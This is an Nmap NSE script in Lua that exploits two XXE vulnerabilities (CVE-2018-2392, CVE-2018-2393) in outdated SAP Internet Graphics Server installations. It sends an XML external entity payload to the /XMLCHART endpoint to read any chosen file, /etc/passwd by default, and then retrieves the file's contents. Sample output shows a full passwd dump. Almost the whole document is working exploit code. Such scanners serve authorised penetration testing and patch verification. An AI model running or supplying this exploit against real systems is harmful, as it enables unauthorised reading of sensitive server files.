local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Script for exploiting CVE-2018-2392 and CVE-2018-2393, two XXE vulnerabilities in outdated versions of SAP IGS servers.
You can now exploit these vulnerabilities by using this script to read arbitrary files on vulnerable systems as
the user who installed the SAP IGS server.
]]

---
--@args http-sap-igs-xmlchart-xxe.filename File to read from the remote server. Default: /etc/passwd
--@output
-- Nmap scan report for 172.16.30.29
-- Host is up (0.023s latency).
--
-- PORT      STATE SERVICE
-- 40080/tcp open  sap-internet-graphics-server
-- | http-sap-igs-xmlchart-xxe:
-- |   cve: CVE-2018-2392 and CVE-2018-2393
-- |   reference: https://www.troopers.de/troopers18/agenda/3r38lr/
-- |   remote_file_link: http://172.16.30.29:40080/output/ImageMap_1586957686140694647006976927559092.htm
-- |   remote_file_name: /etc/passwd
-- |   remote_file_content: at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
-- | bin:x:1:1:bin:/bin:/bin/bash
-- | daemon:x:2:2:Daemon:/sbin:/bin/bash
-- | ftp:x:40:49:FTP account:/srv/ftp:/bin/bash
-- | games:x:12:100:Games account:/var/games:/bin/bash
-- | gdm:x:107:112:Gnome Display Manager daemon:/var/lib/gdm:/bin/false
-- | haldaemon:x:101:102:User for haldaemon:/var/run/hald:/bin/false
-- | lp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bash
-- | mail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/false
-- | man:x:13:62:Manual pages viewer:/var/cache/man:/bin/bash
-- | messagebus:x:100:101:User for D-Bus:/var/run/dbus:/bin/false
-- | news:x:9:13:News system:/etc/news:/bin/bash
-- | nobody:x:65534:65533:nobody:/var/lib/nobody:/bin/bash
-- | ntp:x:74:108:NTP daemon:/var/lib/ntp:/bin/false
-- | polkituser:x:104:107:PolicyKit:/var/run/PolicyKit:/bin/false
-- | postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/bin/false
-- | pulse:x:105:109:PulseAudio daemon:/var/lib/pulseaudio:/bin/false
-- | puppet:x:103:106:Puppet daemon:/var/lib/puppet:/bin/false
-- | root:x:0:0:root:/root:/bin/bash
-- | sshd:x:71:65:SSH daemon:/var/lib/sshd:/bin/false
-- | suse-ncc:x:106:111:Novell Customer Center User:/var/lib/YaST2/suse-ncc-fakehome:/bin/bash
-- | uucp:x:10:14:Unix-to-Unix CoPy system:/etc/uucp:/bin/bash
-- | uuidd:x:102:104:User for uuidd:/var/run/uuidd:/bin/false
-- | wwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/false
-- | admin:x:1000:100:admin:/home/admin:/bin/bash
-- | j45adm:x:1001:1001:SAP System Administrator:/home/j45adm:/bin/csh
-- | sybj45:x:1002:1001:SAP Database Administrator:/sybase/J45:/bin/csh
-- |_sapadm:x:1003:1001:SAP System Administrator:/home/sapadm:/bin/false
--
--@xmloutput
-- <elem key="cve">CVE-2018-2392 and CVE-2018-2393</elem>
-- <elem key="reference">https://www.troopers.de/troopers18/agenda/3r38lr/</elem>
-- <elem key="remote_file_link">http://172.16.30.29:40080/output/ImageMap_1586957686140694647006976927559092.htm</elem>
-- <elem key="remote_file_name">/etc/passwd</elem>
-- <elem key="remote_file_content">at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash ... &#xa;sapadm:x:1003:1001:SAP System Administrator:/home/sapadm:/bin/false</elem>

author = "Vladimir @_generic_human_ Ivanov"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "vuln"}
portrule = shortport.port_or_service(40080, "sap-internet-graphics-server", "tcp", "open")

action = function(host, port)
  local filename = stdnse.get_script_args("http-sap-igs-xmlchart-xxe.filename")
  if filename == nil then
    filename = '/etc/passwd'
  end
  local path = "/XMLCHART"
  local data_name = "data"
  local data_filename = "data.xml"
  local xxe_name = "custo"
  local xxe_filename = "custo.xml"
  local mime = "application/xml"
  local first_response, second_response, download_link, file_content

  local data_payload = '<?xml version="1.0" encoding="UTF-8"?>\r\n<ChartData>\r\n\t<Categories>' ..
          '\r\n\t\t<Category>ALttP</Category>\r\n\t</Categories>\r\n\t<Series label="Label">' ..
          '\r\n\t\t<Point>\r\n\t\t\t<Value type="y">5555</Value>\r\n\t\t</Point>\r\n\t</Series>\r\n</ChartData>\r\n'

  local xxe_payload = '<?xml version="1.0" encoding="UTF-8"?>' ..
          '\r\n<!DOCTYPE Extension [<!ENTITY xxe SYSTEM "' .. filename .. '">]>' ..
          '\r\n<SAPChartCustomizing version="1.1">' ..
          '\r\n\t<Elements>\r\n\t\t<ChartElements>\r\n\t\t\t<Title>\r\n\t\t\t\t<Extension>&xxe;</Extension>' ..
          '\r\n\t\t\t</Title>\r\n\t\t</ChartElements>\r\n\t</Elements>\r\n</SAPChartCustomizing>\r\n'

  local options = { header={} }
  options['header']['Content-Type'] = "multipart/form-data; boundary=SAP_IGS_XXE"
  options['content'] = '--SAP_IGS_XXE' ..
          '\r\nContent-Disposition: form-data; name="' .. data_name .. '"; filename="' .. data_filename ..
          '"\r\nContent-Type: ' .. mime .. '\r\n\r\n' .. data_payload .. '--SAP_IGS_XXE' ..
          '\r\nContent-Disposition: form-data; name="' .. xxe_name .. '"; filename="' .. xxe_filename ..
          '"\r\nContent-Type: ' .. mime .. '\r\n\r\n' .. xxe_payload .. '--SAP_IGS_XXE--\r\n'

  first_response = http.post(host, port, path, options, { no_cache = true })

  -- try and match download link
  download_link = 'qwe'
  if first_response.status == 200 then
    download_link = string.match(first_response.body, 'ImageMap" href="(.*)">ImageMap')
    second_response = http.get(host, port, download_link)
    if second_response.status == 200 then
      file_content = string.match(second_response.body, '^<area shape=rect coords="0, 0,0, 0" (.*)>\r\n$')
    else
      return
    end
  else
    return
  end

  local output_tab = stdnse.output_table()
  output_tab.cve = 'CVE-2018-2392 and CVE-2018-2393'
  output_tab.reference = 'https://www.troopers.de/troopers18/agenda/3r38lr/'
  output_tab.remote_file_link = 'http://' .. tostring(host.ip) .. ':' .. tostring(port.number) .. download_link
  output_tab.remote_file_name = filename
  if file_content ~= nil then
    output_tab.remote_file_content = file_content
  end
  return output_tab
end
